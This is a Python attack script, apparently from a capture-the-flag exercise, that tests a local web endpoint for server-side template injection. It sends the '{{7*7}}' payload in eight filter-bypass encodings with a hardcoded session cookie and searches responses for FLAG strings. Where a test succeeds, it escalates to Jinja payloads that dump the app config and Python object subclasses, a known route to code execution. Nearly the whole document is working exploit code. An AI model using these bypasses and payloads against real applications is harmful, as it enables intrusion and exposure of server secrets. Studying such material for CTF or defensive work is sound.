import requests
import urllib.parse
import base64
import re

# Target endpoint
base_url = "http://127.0.0.1:5000"
endpoint = "/total_loan_payments"

# Session cookie from context
session_cookie = "eyJ1c2VyX2lkIjoxfQ.aVYRkA.NZrGBUBLWhE1H3H_nJGpmrxsh5A"
cookies = {'session': session_cookie}

print("[*] SSTI Filter Bypass Test v2")
print(f"[*] Target: {base_url}{endpoint}")
print("=" * 50)

# Core payload - simple calculation to test if SSTI works
base_payload = "{{7*7}}"

# Encode the payload in different ways
test_payloads = [
    ("raw", base_payload),
    ("url_encode", urllib.parse.quote(base_payload)),
    ("double_url_encode", urllib.parse.quote(urllib.parse.quote(base_payload))),
    ("html_entities", base_payload.replace("{", "&#123;").replace("}", "&#125;")),
    ("hex", base_payload.encode().hex()),
    ("unicode", ''.join(f'\\u{ord(c):04x}' for c in base_payload)),
    ("base64", base64.b64encode(base_payload.encode()).decode()),
    ("url_only_delims", base_payload.replace('{{', '%7B%7B').replace('}}', '%7D%7D')),
]

successful_tests = []
all_flags = []

# Test all payload variations
for idx, (encoding_name, payload) in enumerate(test_payloads, 1):
    print(f"\n[Test {idx}/{len(test_payloads)}] {encoding_name}")
    print(f"Payload: {payload}")
    
    try:
        # Send request
        params = {'data': payload}
        response = requests.get(
            f"{base_url}{endpoint}",
            params=params,
            cookies=cookies,
            timeout=10,
            allow_redirects=False
        )
        
        print(f"Status: {response.status_code}")
        print(f"Response length: {len(response.text)} bytes")
        
        # Check for flag
        flag_search = re.search(r'FLAG\{[^}]+\}', response.text)
        has_49 = '49' in response.text
        has_calculation = '7*7' not in response.text and ('49' in response.text or '42' in response.text or '14' in response.text)
        
        if flag_search:
            flag = flag_search.group(0)
            print(f"[!] FLAG FOUND: {flag}")
            all_flags.append(flag)
            successful_tests.append((encoding_name, payload, flag))
        
        elif has_49:
            print(f"[!] CALCULATION EXECUTED: Found '49' in response")
            print(f"Response preview: {response.text[:200]}")
            successful_tests.append((encoding_name, payload, "calc_executed"))
        
        else:
            # Check if it's a calculation result or something else
            if len(response.text) < 500:
                print(f"Response: {response.text[:200]}")
            else:
                print("No obvious SSTI execution detected")
        
    except Exception as e:
        print(f"Error: {e}")

# Summary
print("\n" + "=" * 50)
print("[*] TEST SUMMARY")
print(f"Completed tests: {len(test_payloads)}")
print(f"Successful executions: {len(successful_tests)}")

if all_flags:
    print("\n[!] FLAGS DISCOVERED:")
    for flag in all_flags:
        print(f"  {flag}")

if successful_tests:
    print("\n[!] WORKING ENCODINGS:")
    for encoding, payload, result in successful_tests:
        print(f"  - {encoding}: {result}")
        print(f"    Payload: {payload[:50]}...")

# Test some more complex payloads if basic ones worked
if successful_tests:
    print("\n[*] Testing more complex payloads based on successful encoding...")
    
    complex_payloads = [
        "{{config.items()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{request.args}}",
        "{{request.cookies}}",
        "{{42+8}}",
    ]
    
    for complex_payload in complex_payloads[:2]:  # Test just 2
        try:
            params = {'data': complex_payload}
            response = requests.get(
                f"{base_url}{endpoint}",
                params=params,
                cookies=cookies,
                timeout=10,
                allow_redirects=False
            )
            
            flag_search = re.search(r'FLAG\{[^}]+\}', response.text)
            if flag_search:
                flag = flag_search.group(0)
                print(f"[!] FLAG with complex payload: {flag}")
                all_flags.append(flag)
            
        except Exception as e:
            print(f"Complex payload error: {e}")

print("\n[*] Test complete")
